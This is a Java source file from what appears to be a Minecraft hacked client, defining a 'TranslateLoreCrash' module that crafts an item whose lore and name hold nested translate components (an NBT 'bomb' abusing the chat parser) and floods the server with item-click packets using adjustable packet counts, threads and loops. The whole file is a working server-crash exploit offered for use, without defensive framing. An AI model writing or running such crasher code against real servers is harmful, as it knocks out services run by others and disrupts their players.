package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataItemName;
import me.dannycrasher.client.protocol.components.data.impl.DataLore;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.Tag;

public class TranslateLoreCrash extends Module {
	private ScheduledExecutorService executorService;

	public TranslateLoreCrash() {
		super("TranslateLore", "Nested translate lore/item_name bomb (chat parser Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 100, "100");
		addArgument("lineCount", ArgumentType.INT, 1, 256, "32");
		addArgument("chars", ArgumentType.INT, 1, 100, "40");
		addArgument("map size", ArgumentType.INT, 1, 46, "46");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1500");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "15");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return;
		}

		Tag nested = NbtBombTrees.translateNest(context.getInt("chars"));
		List<Tag> lines = new ArrayList<>();
		for (int i = 0; i < context.getInt("lineCount"); i++) {
			lines.add(nested);
		}

		DataComponents components = new DataComponents();
		components.put(new DataLore(lines));
		components.put(new DataItemName(nested));
		ItemStack stack = new ItemStack(ItemType.STONE.getId(protocol), 1, components);
		executorService = ClickCrashRunner.startItemClick(
				this, context, executorService, stack,
				context.getInt("map size"), context.getInt("packets"),
				context.getInt("threadSleep"), context.getInt("loopAmount")
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
